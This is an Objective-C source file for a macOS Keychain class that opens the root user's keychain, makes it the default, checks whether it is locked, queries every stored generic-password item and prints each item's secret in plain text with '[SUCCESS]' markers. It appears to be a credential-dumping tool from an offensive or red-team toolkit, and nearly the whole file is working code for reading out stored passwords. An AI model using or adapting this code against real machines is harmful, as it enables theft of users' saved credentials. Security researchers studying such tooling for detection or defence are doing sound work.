#import "keychain.h"

@implementation Keychain

+ (void) printSecErr:(OSStatus) status {
    CFStringRef errCFMsg = SecCopyErrorMessageString(status, nil);
    CFIndex length = CFStringGetLength(errCFMsg);
    CFIndex maxSize = CFStringGetMaximumSizeForEncoding(length, kCFStringEncodingUTF8);
    char *errStr = (char *)malloc(maxSize);
    CFStringGetCString(errCFMsg, errStr, maxSize,kCFStringEncodingUTF8);
    printf("[ERROR] %s\n", errStr);
}

+ (BOOL) setRootDefaultKeychain {
    // Open root keychain
    SecKeychainRef rootKeychain;
    SecKeychainOpen("/private/var/root/Library/Keychains", &rootKeychain);

    // Set System keychain to default
    OSStatus setDefaultStatus = SecKeychainSetDefault(rootKeychain);

    if (setDefaultStatus != 0) {
        // unable to set default keychain
        [Keychain printSecErr:setDefaultStatus];
        CFRelease(rootKeychain);
        return false;
    }

    CFRelease(rootKeychain);
    return true;
}

+ (int) checkAccessKeychain {
    SecKeychainRef rootKeychainCopy;
    OSStatus copyRootKeychainStatus = SecKeychainCopyDefault(&rootKeychainCopy);

    if (copyRootKeychainStatus != 0) {
        // unable to copy default keychain
        CFRelease(rootKeychainCopy);
        [Keychain printSecErr:copyRootKeychainStatus];
        return FAIL_DEFAULT_KEYCHAIN_COPY;
    }

    if ([Keychain _isKeychainLocked:rootKeychainCopy]) {
        // keychain is locked
        CFRelease(rootKeychainCopy);
        return FAIL_KEYCHAIN_LOCKED;
    }

    return 0;
}

+ (CFMutableDictionaryRef) createKeychainSearchQuery {
    CFMutableDictionaryRef query = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(query, kSecClass, kSecClassGenericPassword);
    CFDictionarySetValue(query, kSecMatchLimit, kSecMatchLimitAll);
    CFDictionarySetValue(query, kSecReturnAttributes, kCFBooleanTrue);
    CFDictionarySetValue(query, kSecReturnData, kCFBooleanFalse);
    CFDictionarySetValue(query, kSecReturnRef, kCFBooleanTrue);
    CFDictionarySetValue(query, kSecUseDataProtectionKeychain, kCFBooleanFalse);

    return query;
}

+ (void) getKeychainItemPassword:(NSDictionary *) item {
    printf("[DEBUG] Trying: %s\n", [[item objectForKey:@"acct"] UTF8String]);
    SecKeychainItemRef secItemRef = (__bridge SecKeychainItemRef _Nonnull)([item objectForKey:@"v_Ref"]);

    UInt32 cfDataLength;
    void* cfData;
    OSStatus copyKeychainItemDataStatus = SecKeychainItemCopyContent(secItemRef, nil, nil, &cfDataLength, &cfData);
    if (copyKeychainItemDataStatus != ERR_SUCCESS) {
        [Keychain printSecErr:copyKeychainItemDataStatus];
        return;
    }

    NSData* entryData = [[NSData alloc] initWithBytes:cfData length:cfDataLength];
    NSString* entryString = [[NSString alloc] initWithData:entryData encoding:NSUTF8StringEncoding];

    if (entryString.length > 0) {
        printf("[SUCCESS] %s\n", [entryString UTF8String]);
    }
    else {
        printf("[INFO] Password is empty\n");
    }
}

+ (BOOL) _isKeychainLocked:(SecKeychainRef) keychain {

    SecKeychainStatus myKeychainStatus;
    OSStatus _ = SecKeychainGetStatus(keychain, &myKeychainStatus);

    if (myKeychainStatus == 2) {
        printf("[ERROR] Keychain is locked\n");
        return true;
    }
    printf("[SUCCESS] Keychain is unlocked\n");
    return false;
}


@end